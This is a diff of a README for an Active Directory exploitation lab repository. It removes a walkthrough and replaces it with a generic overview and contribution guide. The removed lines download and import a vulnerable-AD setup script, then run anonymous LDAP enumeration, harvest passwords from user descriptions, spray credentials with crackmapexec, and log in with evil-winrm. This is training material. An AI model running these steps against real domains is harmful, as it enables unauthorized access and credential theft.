@@ -1,66 +1,35 @@
-# Installation
-![[Pasted image 20210510205251.png]]
-Change DomainName and DomainNetbiosName
-```powershell
-Install-ADDSForest -CreateDnsDelegation:$false -DatabasePath "C:\\Windows\\NTDS" -DomainMode "7" -DomainName "change.me" -DomainNetbiosName "change" -ForestMode "7" -InstallDns:$true -LogPath "C:\\Windows\\NTDS" -NoRebootOnCompletion:$false -SysvolPath "C:\\Windows\\SYSVOL" -Force:$true
-(wget https://raw.githubusercontent.com/WaterExecution/vulnerable-AD-plus/master/vulnadplus.ps1).content | Out-File 'vulnadplus.ps1'
-Import-Module vulnadplus.ps1
-Invoke-VulnAD -UsersLimit 200 -DomainName "change.me"
-```
+# Exploitation Lab Writeups Repository
 
-# Initial Access
-## Anonymous LDAP query
-```bash
-ldapsearch -h 10.10.10.244 -x -s base namingcontexts
-```
-```bash
-# extended LDIF
-#
-# LDAPv3
-# base <> (default) with scope baseObject
-# filter: (objectclass=*)
-# requesting: namingcontexts 
-#
+Welcome to the Exploitation Lab Writeups Repository! In this repository, you'll find a collection of detailed writeups showcasing various techniques for exploiting the lab environment. These writeups are designed to help you better understand and practice real-world exploitation scenarios.
 
-#
-dn:
-namingcontexts: DC=change,DC=me
-namingcontexts: CN=Configuration,DC=change,DC=me
-namingcontexts: CN=Schema,CN=Configuration,DC=change,DC=me
-namingcontexts: DC=DomainDnsZones,DC=change,DC=me
-namingcontexts: DC=ForestDnsZones,DC=change,DC=me
+## Table of Contents
 
-# search result
-search: 2
-result: 0 Success
+1. [Lab Environment](#lab-environment)
+2. [Writeup List](#writeup-list)
+3. [How to Contribute](#how-to-contribute)
 
-# numResponses: 2
-# numEntries: 1
 
-```
-```bash
-ldapsearch -h 10.10.10.244 -x -b "DC=change,DC=me" | grep -i description #-A 22 for username
-```
-``` bash
-description: New user generated password: =W{Z5FM
-description: New user generated password: @i@EJrd
-description: New user generated password: &De0/tC
-```
-## Kerberoasting
-```bash
-ldapsearch -h 10.10.10.244 -x -b "DC=change,DC=me" | grep -i service
-```
-```bash
-servicePrincipalName: mssql_svc/mssqlserver.change.me
-servicePrincipalName: http_svc/httpserver.change.me
-servicePrincipalName: exchange_svc/exserver.change.me
-```
-```bash
-crackmapexec smb 10.10.10.244 -u user.txt -p password.txt --continue-on-success
-```
-```bash
-[+] change.me\exchange_svc:freddy
-```
-```bash
-evil-winrm -i 10.10.10.244 -u exchange_svc -p freddy
-```
+## Lab Environment
+
+The lab environment is intentionally set up to mimic real-world conditions with a focus on Active Directory vulnerabilities. This environment is for educational and training purposes only and should be used responsibly.
+
+## Writeup List
+
+Here's a list of writeups available in this repository:
+
+1. [**ASREProast to Zerologon**](writeups/writeup1.md) - A detailed guide on exploiting Technique A.
+
+We will continue to add more writeups to cover a wide range of techniques, so stay tuned for updates!
+
+## How to Contribute
+
+We welcome contributions from the cybersecurity community. If you'd like to share your own writeup or suggest improvements to existing ones, please follow these steps:
+
+1. Fork this repository.
+2. Create a new branch for your work.
+3. Add your writeup or make your changes.
+4. Submit a pull request, describing your contribution.
+
+Your contributions help us maintain a comprehensive resource for the cybersecurity community.
+
+Happy learning and happy hacking!
